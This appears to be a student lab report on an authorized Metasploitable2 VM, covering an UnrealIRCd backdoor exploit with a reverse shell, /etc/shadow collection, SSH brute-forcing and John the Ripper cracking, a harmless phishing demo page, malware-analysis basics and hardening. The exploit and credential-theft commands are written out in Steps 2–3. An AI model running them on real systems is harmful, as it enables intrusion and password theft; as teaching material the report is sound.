Step 2 —  Exploitation with Metasploit

Exploitation, Reverse Shell, Post-Exploitation

Objective: exploit a known vulnerability on Metasploitable2, obtain an interactive shell on the target (reverse shell), and perform post-exploit enumeration and credential collection for analysis.

A — Theory 

Exploit: use a known vulnerability in a network service to run arbitrary code on the target. In this lab we used the UnrealIRCd 3.2.8.1 backdoor exploit (exploit/unix/irc/unreal_ircd_3281_backdoor). The exploit abuses a backdoor command to execute shell commands remotely.

Payload / Reverse shell: a reverse shell payload makes the target connect back to the attacker (LHOST:LPORT). The attacker runs a listener (Metasploit’s handler or nc) and the target opens a TCP connection to it which gives an interactive shell on the target.

Post-exploitation: once a shell exists, enumerate system info, running services, users, and collect sensitive artifacts (e.g., /etc/shadow) for offline analysis. Meterpreter provides sysinfo and hashdump convenience commands; on a plain shell you use uname -a, cat /etc/os-release and read /etc/shadow.

B —  (concise mapping of commands → purpose)

use exploit/unix/irc/unreal_ircd_3281_backdoor
→ selected the exploit module that targets UnrealIRCd backdoor.

set RHOST 192.168.56.101, set RPORT 6667
→ target address and IRC port.

set PAYLOAD cmd/unix/reverse, set LHOST 192.168.56.102, set LPORT 4444
→ chose a reverse shell payload that causes the target to connect back to Kali at 192.168.56.102:4444.

set ExitOnSession false , set VERBOSE true , exploit
→ keep msfconsole running after session opens and show verbose output. exploit launches the attack; Metasploit started the handler and the target connected back.

Metasploit printed:

Command shell session 2 opened (192.168.56.102:4444 -> 192.168.56.101:60350)


→ this confirms a reverse shell was established.

background (or used sessions to manage sessions)
→ backgrounded the session so msfconsole could still be used; then sessions -i 2 / sessions 2 to interact.

Post-exploitation commands (ran on the target shell):

whoami → current user (result: root)

id → uid/gid (confirmed root privileges)

uname -a → kernel and system info (equivalent to sysinfo in meterpreter)

cat /etc/issue or cat /etc/os-release → distribution info

hostname, pwd, ls -la / → basic environment and location info

ip a (or ifconfig -a) → network interfaces / IPs

netstat -tulpn (or ss -tulpn) → listening services and their PIDs

ps aux | head -n 30 → running processes

cp /etc/shadow /tmp/shadow.txt and cp /etc/passwd /tmp/passwd.txt → prepared credential files for transfer (this is the shell equivalent of meterpreter hashdump)

head -n 20 /etc/shadow (or /tmp/shadow.txt)
→ preview of password hash entries (you captured this for evidence).

C — Why sysinfo / hashdump didn’t work

sysinfo and hashdump are meterpreter commands. You used a plain command shell payload (cmd/unix/reverse), not meterpreter, so you must run native shell commands instead:

sysinfo ≈ uname -a, cat /etc/os-release, hostname

hashdump ≈ reading /etc/shadow (requires root); then transfer to attacker for offline cracking

Step3-Password Attacks

Objective: Demonstrate offline password attacks and credential harvesting in a controlled lab. Steps: brute‑force SSH (online attack), collect hashed password data from the compromised system (/etc/shadow), and attempt offline cracking with John the Ripper.

Why: Password attacks show how weak credentials and exposed authentication services can be exploited. Offline hash cracking demonstrates the risk of stolen hashes and the need for strong password storage and policies.

2. Brute‑force SSH login (Hydra / sshpass)

Theory:

Brute-force attack: an attacker tries many username/password combinations against a service (SSH here) until a valid pair is found. Tools like Hydra automate and parallelize attempts across usernames and password lists.

Limitations & defenses: rate limiting, account lockout, multi-factor authentication, and blocking source IPs are effective mitigations. Modern servers may disable or deprecate weak key exchange / host-key algorithms — this can block some tools (you encountered ssh-rsa mismatch).

Ethics: Brute-force is noisy and can disrupt services; only perform against authorized targets.

Practical notes:

Use focused credential lists (names likely in the environment) to reduce noise.

Hydra is fast but depends on the SSH client library capabilities; for legacy servers you may need sshpass loops or custom scripts.

Always capture output (-o or tee) and timestamp everything for reporting.

Evidence to collect for report: Hydra output file, any successful login screenshot, and the SSH server banner/version (from nmap -sV).

3. Hash collection & offline cracking with John the Ripper

Theory:

/etc/passwd & /etc/shadow (Unix): /etc/passwd holds user account info; password hashes are stored in /etc/shadow (root‑read). Attackers with /etc/shadow can attempt offline cracking without touching the server again — this is high-risk.

Hash formats: common Unix hash markers:

$1$ → MD5-crypt (weak by modern standards)

$5$ → SHA-256-crypt

$6$ → SHA-512-crypt (stronger)

* or ! or x may indicate locked/no-password

Salt & iterations: modern crypt(3) schemes include salts and iteration counts; salts prevent identical passwords from having the same hash and impede precomputed attacks (rainbow tables).

Cracking approaches:

Dictionary attack: try words from a list (rockyou, corp wordlists).

Rules / mangling: modify words (leet speak, suffix numbers) to improve success (John’s --rules).

Brute force / mask attacks: exhaustive try of all combinations — expensive and often impractical for long passwords.

Hybrid attacks: dictionary + mask.

GPU cracking: tools like Hashcat use GPUs for much higher throughput than CPU John; John Jumbo can also use OpenCL.

What john does in our flow:

Combine passwd + shadow into unshadowed.txt (john-friendly).

Run john --wordlist=... to test candidates against hashes.

john --show reveals cracked credentials.

Interpreting results:

john --show prints usernames and cracked passwords; record successes in a findings table.

If John reports “No password hashes loaded”, unshadowed.txt is empty or malformed — re-check the transfer and file formatting.

Evidence to collect for report: unshadowed.txt head, john command line used, john --show output, and any cracked credentials. For each cracked account show hash (or partial), cracked password, and the method (wordlist + rules).

4. Defensive recommendations (mitigations)

Prevent online brute-force (SSH):

Enforce strong passwords and password policies.

Use multi-factor authentication (MFA) for all privileged logins.

Rate-limit authentication attempts (fail2ban, ssh guard).

Change default SSH port does not stop attackers but reduces noisy scans.

Use public-key authentication and disable password auth where possible: /etc/ssh/sshd_config: PasswordAuthentication no and PermitRootLogin no.

Limit access by IP with firewall rules (allow SSH only from trusted management subnets).

Prevent offline hash cracking consequences:

Use modern password hashes with salts and high iteration counts (bcrypt, Argon2, scrypt).

Enforce longer passphrases and complexity to increase brute-force cost.

Rotate and expire credentials, and monitor for exfiltration of shadow/passwd.

Restrict file access: /etc/shadow must be root-only (normal), but enforce strong host security so attackers can’t reach it.

Monitor unexpected copies of sensitive files and alert on tar/ftp/nc usage in logs.

Operational:

Keep systems patched (fixes may close privilege escalation used to obtain root).

Use host-based intrusion detection (OSSEC, auditd rules) to detect suspicious actions.

Use centralized logging and alerting for repeated failed auth attempts.

5. Reporting — what to include (nice checklist)

Test scope (authorized Metasploitable2 lab VM only), date/time, attacker IP (Kali), and tools/versions.

Commands run (exact copy/paste).

Hydra/sshpass output file(s) and screenshots.

Evidence of access (successful SSH session screenshot).

ls -l and head of shadow.txt & passwd.txt.

unshadowed.txt head.

john --show output and cracked passwords (if any).

Risk rating and recommendations per finding (e.g., "weak admin password — high risk — recommend enforce MFA and password change").

Remediation steps (firewall rules, disable unused services, patching etc.) — tie to your Step 6 hardening done earlier.

6. Short ready‑to‑paste summary paragraph for your Word report

Password attacks & hash cracking: Using Hydra/sshpass we performed a controlled SSH credential test against the authorized lab VM (192.168.56.101). After obtaining shell access we collected /etc/passwd and /etc/shadow, transferred them to the attacker VM, combined them with unshadow and performed offline cracking using John the Ripper with rockyou and rules. This demonstrated the practical risk of weak credentials and exposed hashed password files. Mitigations include enforcing MFA, using strong salted hash algorithms (bcrypt/argon2), rate‑limiting/auth lockouts, and restricting access to privileged files.


Step4 - Social Engineering (Simulation Only)

What is phishing?
Phishing is a type of social-engineering attack where attackers send fake emails or make fake web pages to trick people into giving secrets (passwords, OTPs, personal info) or clicking malicious links.

Common phishing types:

Email phishing: fake emails that look like they’re from banks, services, or colleagues.

Spear phishing: targeted to a specific person with personal details.

Clone-site phishing: a fake login page that looks like the real site.

Smishing / Vishing: SMS or voice-based phishing.

How phishing works (simple flow):

Attacker crafts a convincing message (subject, sender spoofing, urgent tone).

Message contains a link or attachment.

Victim clicks link → fake site or malware.

Victim enters credentials or runs malware → attacker gets access.

Phishing indicators (what to teach people to spot):

Sender address doesn’t match the legitimate domain (hover and examine full address).

Strange or urgent language: “Act now” / “Verify immediately”.

Links that don’t match visible text (hover to preview URL).

Poor spelling/grammar, wrong logos, or odd formatting.

Unexpected attachments or requests for credentials/MFA codes.

Emails that ask to bypass normal procedures (pay, transfer, share secrets).

Goals of a phishing simulation (training, not punishment):

Teach people to recognize suspicious messages.

Encourage the habit of hovering links and verifying sender.

Teach reporting: how and where to report suspected phishing.

Measure improvement: click rate, report rate, and time-to-report over repeated exercises.

Ethics & rules (must include in notes):

Always get written authorization before running any simulated campaign.

Use non-sensitive and clearly labelled simulations (e.g., “SIMULATION — DO NOT ENTER REAL CREDENTIALS”).

Provide immediate feedback and short training when someone falls for the simulation.

Avoid embarrassing or punitive traps — focus on learning.

Simple training message to show after a simulated click:
“Training notice: this was a safe phishing simulation. 

Metrics to record (notes):

Click rate (% of recipients who clicked the simulated link).

Report rate (% who reported the email).

Time-to-report (how quickly they reported).

Repeat results over time to measure improvement.

Commands (terminal commands, with one-line explanation each)

These commands are safe for local classroom demos. Never run real campaigns without permission. Always label the demo page clearly “SIMULATION — DO NOT ENTER REAL CREDENTIALS.”

1) Create project folder and add the demo HTML (Linux / macOS)
mkdir -p ~/phish-sim
cd ~/phish-sim


(Create a folder and move into it.)

Create the demo page (here-doc will create index.html):

cat > index.html <<'EOF'
<!doctype html>
<!-- SIMULATION — DO NOT ENTER REAL CREDENTIALS -->
<html><body><h1>SIMULATION — Login</h1>
<p>This is a training page. Do not enter real credentials.</p>
<form onsubmit="alert('Training: report suspicious messages.'); return false;">
  <input placeholder="email"><br><input placeholder="password" type="password"><br>
  <button type="submit">Login</button>
</form>
</body></html>
EOF


(This writes a simple, harmless HTML file. The form does not submit anywhere — it just shows a training alert.)

2) Serve the page locally (Python quick server)
# start the server on port 8000
python3 -m http.server 8000


(Open http://localhost:8000 in a browser to view the page. Stop server with Ctrl+C.)

Check server is running (from another terminal):

curl -I http://localhost:8000
The demo page will be dispalyed whre user can enter email and password so that user can get training about how phishing email occurs.


Step 5- Malware Basics

static vs dynamic analysis (short)

Static analysis (one line): inspect a file without executing it — file type, strings, symbols, headers, hashes. Useful for quick indicators (file type, embedded URLs, suspicious strings).

Dynamic analysis (one line): run the sample in an instrumented, isolated environment and observe runtime behavior — system calls, files created, network connections, processes, registry (Windows), etc. This reveals behavior that static analysis can miss (deobfuscated, unpacked behavior).

Why both? Static is fast, safe, and low-cost. Dynamic confirms real behavior and uncovers runtime-only actions.
Static analysis — what & why (fast checks)

Static analysis examines a file without executing it. It’s safe and quick, and gives initial indicators that help decide whether deeper analysis is needed.

file sample.py — identifies the file type (script vs binary). This tells you the execution context (interpreted vs compiled) and risks.

sha256sum sample.py — produces a cryptographic fingerprint (hash) that proves the sample’s identity and integrity. Useful for tracking the sample and referencing it in the report.

strings -n 4 sample.py — extracts readable text from the file (hard-coded paths, URLs, commands). Even for scripts, strings reveal intent (e.g., file paths, network hosts, suspicious commands).

Why static first: it’s non-destructive and fast; you can flag obvious indicators (e.g., network IPs or suspicious system commands) before running anything.

Dynamic analysis — what & why (observe behavior)

Dynamic analysis runs the sample in an isolated environment (VM snapshot, loopback-only networking) to observe actual runtime behavior:

Start a local TCP listener (nc -lvnp 9009) to capture any network attempts the sample makes. Using loopback (127.0.0.1) keeps the traffic local and safe.

Execute the sample (python3 sample.py). The benign sample writes a file to /tmp and attempts a harmless local connect. Observing these actions confirms real behavior that static analysis only suggested.

Why dynamic: some behavior only appears at runtime (decryption, network calls, process creation). Dynamic analysis confirms actual actions and captures runtime artifacts for forensic evidence.

Static analysis (file, hash, strings) gave quick indicators of intent; dynamic analysis (run under a controlled listener and strace) confirmed runtime behavior (file write and network attempt). 


Step 6- System Hardening
System hardening is the process of securing a computer system by reducing its vulnerability surface. The goal is to make it more resistant to attacks by removing potential entry points, vulnerabilities, and misconfigurations. It is a critical part of cybersecurity practices and helps protect systems from unauthorized access, malware, and other security threats.

1️. Apply Security Patches

Definition:
Security patches are updates released by software vendors to fix known vulnerabilities, bugs, or weaknesses in the operating system, applications, or system libraries.

Purpose:

Protects against known exploits that attackers use to compromise systems.

Ensures the system is running the most secure and stable version of all software.

Reduces risk from vulnerabilities like privilege escalation, remote code execution, or denial-of-service attacks.

Example Practices:

Regularly check for OS updates.

Install updates for all installed packages, including network services and libraries.

Automate security updates where possible for critical patches.

Commands:

sudo apt update
sudo apt upgrade -y
sudo apt dist-upgrade -y   # optional, upgrades dependencies too
sudo apt autoremove -y 

Note: Neglecting updates is a major cause of security breaches in real-world environments.

2️. Configure Firewall to Block Malicious Traffic

Definition:
A firewall is a network security device or software that monitors and controls incoming and outgoing network traffic based on a set of rules.

Purpose:

Blocks unauthorized access to the system while allowing legitimate connections.

Filters both inbound (incoming) and outbound (outgoing) traffic.

Reduces attack surface by exposing only essential services to the network.

Example Practices:

Default-deny policy for inbound traffic (block all unless explicitly allowed).

Allow only required services (e.g., SSH, HTTP, HTTPS).

Log firewall events to detect suspicious activity.

Use advanced rules to detect and block malicious traffic patterns.

Commands:

UFW - uncomplicated firewall, common on Ubuntu/Kali
sudo ufw default deny incoming     block all incoming connections by default
sudo ufw default allow outgoing    allow all outgoing connections
sudo ufw allow ssh                 allow SSH if you need remote access
sudo ufw allow 80/tcp              allow HTTP
sudo ufw allow 443/tcp             allow HTTPS
sudo ufw enable                    activate the firewall
sudo ufw status verbose   

Iptables:sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -A INPUT -j DROP
sudo iptables-save 
Impact:

Protects against port scanning, brute-force attacks, malware communications, and other network-based threats.

Enforces the principle of least privilege for network access.

3. Disable Unused Services

Definition:
Services are background processes that provide functionality like file sharing, web hosting, or remote access. Unused or unnecessary services can be exploited by attackers.

Purpose:

Minimizes attack surface by eliminating services that could be exploited.

Reduces system resource usage and potential vulnerabilities.

Ensures only essential services required for business or lab operations are running.

Example Practices:

Identify all running services using commands like systemctl list-units --type=service.

Stop and disable unnecessary services (e.g., FTP, Telnet, old database services).

Regularly audit services to ensure only required ones are active.

Impact:

Prevents attackers from exploiting unpatched or misconfigured services.

Strengthens overall system security posture.

Commmands:

sudo systemctl list-units --type=service --state=running

# Disable a service you don’t need, e.g., FTP

sudo systemctl stop vsftpd
sudo systemctl disable vsftpd

Summary:

System hardening is essential for cybersecurity defense. It involves:

Applying security patches – keeping the OS and applications up-to-date to fix vulnerabilities.

Configuring firewalls – controlling traffic to block malicious access while allowing legitimate communication.

Disabling unused services – stopping unnecessary processes to reduce potential attack vectors.

Together, these practices create a more secure system by reducing vulnerabilities, limiting access points, and preventing attacks. They are fundamental steps in building a secure network and server environment.
